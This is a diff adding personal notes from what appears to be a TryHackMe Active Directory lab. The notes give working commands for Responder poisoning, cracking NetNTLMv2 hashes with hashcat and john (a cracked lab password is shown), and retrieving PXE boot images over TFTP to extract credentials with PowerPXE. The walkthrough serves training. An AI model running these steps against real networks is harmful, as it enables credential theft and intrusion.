@@ -92,3 +92,59 @@ Responder will attempt to poison any `Link-Local Multicast Name Resolution (LLMN
 Because these protocols rely on broadcasted requests over a local network, our rogue device can also recieve these requests.
 [[Responder]] will listen to these requests and attempt to send poisoned requests 
 ### Intercepting NetNTLM Challenge
+use Responder to intercept the NetNTLM challenge and Response.
+`responder -I [interface]`
+
+after obtaining the hash, we will use hashcat to attempt to crack the hash
+this is a NTLMv2-SSP Hash to we will use mode 5600
+`hashcat -m 5600 hashfile passwordfile --force --show`
+didn't work for me so I used john
+`john --wordlist=passwordlist.txt hashfile --show`
+FPassword1!      (svcFileCopy) 
+
+##### Relaying the Challenge
+We can try to relay the challenge instead of just capturing it directly (harder because we might not know the permissions of the account)
+	requires that SMB signing is either disable or unenforced enabled. Upon performing a relay, we can make minor changes to the request to pass it along
+
+# Task 6: Microsoft Deployment Toolkit
+
+### MDT and SCCCM
+`Microsoft Deployment Toolkit (MDT)` assists with automating the deployment of Microsoft OS. MDT allows the base OS images to be maintained and updated in a central location. MDT is integrated with `Microsoft's System Center Configuraiton Manager (SCCM)` which manages all updates for Microsoft applications, services, and os. **MDT is used for new deployments**. (allows IT team to preconfigure and manage boot images, you can plug in a network cable and everything happens automatically) **SCCM is the expansion to MDT.** SCM is in charge of patch management and allows IT to review updates and software installed.
+
+### PXE Boot
+Preboot Execution Environment (PXE): used to allow new devices connecting to the network to load an install the OS directly over internet. **PXE is hosted by MDT.** PXE is usually integrated with DHCP, when DHCP assigns a new IP lease, the host is allowed to request the PXE boot image.
+![[PXEBootInfo.png]]
+
+After this proccess is performed, client can use a TFTP connection to download the PXE boot image; this can be exploited:
+	1. Inject a privilege escalation vector (like a local admin account) to gain admin acces to the OS
+	2. Perform password scraping attacks to recover AD credentials used during install
+
+### PXE Boot Image Retrieval
+We ssh into the windows machine with the given credentials
+`ssh thm@THMJMP1.za.tryhackme.com`
+
+to ensure all users of the network can use SSH, we create a folder with our username and copy the powerpxe repo into the folder
+`> mkdir Chamaru`
+`> cd Chamaru`
+`> copy powerpxe\ C:\Users\THM\Documents\Chamaru`
+
+initiate TFTP transfer
+`>tftp -i 10.200.4.202 GET "\TMP\x64{39....28}.bcd" conf.bcd`
+
+After BCD file is recovered, we will use `powerpxe`(powershell script that automatically performs this attack) to read its contents. Powerpxe is not always reliable so we'll do it manually
+
+Move on to powershell
+`>powershell -ep bypass`
+
+Use Get-WimFile function from powerpxe to locate the PXE Boot images from the BCD file we copied earlier
+`>Import-Module .\PowerPXE.ps1`
+`>$BCDFile = "conf.bcd"`
+`>Get-WimFile -bcdFile $BCDFile`
+
+download the windows image
+`>tftp -i 10.200.4.202 Get "\Boot\x64\Images\LiteTouchPE_x64.win" pxeboot.wim`
+
+recover credentials using a powerpxe function
+`>Get-FindCredentials -WimFile pxeboot.wim`
+
+
